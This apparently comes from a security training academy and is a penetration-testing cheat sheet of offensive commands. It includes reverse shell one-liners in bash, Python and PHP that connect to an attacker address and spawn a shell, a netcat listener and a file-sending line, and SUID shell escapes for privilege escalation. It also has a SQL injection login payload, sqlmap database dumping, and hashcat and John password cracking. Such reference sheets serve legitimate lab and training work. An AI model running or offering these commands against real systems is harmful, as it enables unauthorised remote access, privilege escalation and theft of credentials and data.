# CyberShield Academy — Master Cheat Sheet

## Nmap

```bash
nmap -sn 192.168.1.0/24          # host discovery
nmap -sS -sV -O -A target        # full scan
nmap -p- target                  # all 65535 ports
nmap --script vuln target        # vulnerability scripts
nmap -oA output target           # save all formats
```

## Netcat

```bash
nc -lvnp 4444                    # listen for reverse shell
nc target 4444                   # connect
nc -z target 1-1000              # port scan
cat file | nc target 9999        # send file
```

## Reverse Shells (one-liners)

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Metasploit

```bash
msfconsole
search <term>
use exploit/path
show options
set RHOSTS target
set LHOST your_ip
exploit / run
# In session:
sessions -l
sessions -i 1
background
```

## SQLmap

```bash
sqlmap -u "URL?id=1" --dbs
sqlmap -u "URL" --data "user=a&pass=b" --level=3
sqlmap -u "URL?id=1" -D db -T table --dump
```

## Hashcat

```bash
hashcat -m 0    hash.txt wordlist.txt   # MD5
hashcat -m 1000 hash.txt wordlist.txt   # NTLM
hashcat -m 1800 hash.txt wordlist.txt   # sha512crypt
hashcat -m 3200 hash.txt wordlist.txt   # bcrypt
```

## John

```bash
john --wordlist=rockyou.txt hash.txt
john --show hash.txt
```

## Gobuster

```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d target.com -w subdomains.txt
```

## OpenSSL

```bash
openssl s_client -connect target:443
openssl x509 -in cert.pem -text -noout
openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 365 -nodes
openssl enc -aes-256-cbc -in file -out file.enc
openssl enc -d -aes-256-cbc -in file.enc -out file
```

## Linux Priv Esc

```bash
sudo -l                          # sudo rights
find / -perm -4000 2>/dev/null   # SUID binaries
cat /etc/crontab                 # cron jobs
uname -a                         # kernel version
ps aux                           # running processes
netstat -tulpn                   # listening services
cat /etc/passwd | grep -v nologin # user accounts
```

## Useful Wordlists (Kali)

```
/usr/share/wordlists/rockyou.txt          # passwords
/usr/share/wordlists/dirb/common.txt      # directories
/usr/share/wordlists/dirbuster/           # more dirs
/usr/share/seclists/                      # everything
```

## Python Quick Hacks

```python
# Base64
import base64
base64.b64encode(b"hello")
base64.b64decode("aGVsbG8=")

# Hash
import hashlib
hashlib.md5(b"password").hexdigest()
hashlib.sha256(b"data").hexdigest()

# HTTP request
import requests
r = requests.get("http://target.com")
r = requests.post("http://target/login", data={"user":"admin","pass":"' OR 1=1--"})
print(r.text)
```

## GTFOBins Reference

If you find a SUID binary, check: **https://gtfobins.github.io**

Common exploitable binaries:
```bash
# vim (if SUID)
vim -c ':!/bin/sh'

# find (if SUID)
find . -exec /bin/sh \; -quit

# python (if SUID)
python3 -c 'import os; os.system("/bin/sh")'

# nmap (older versions)
nmap --interactive
!sh
```
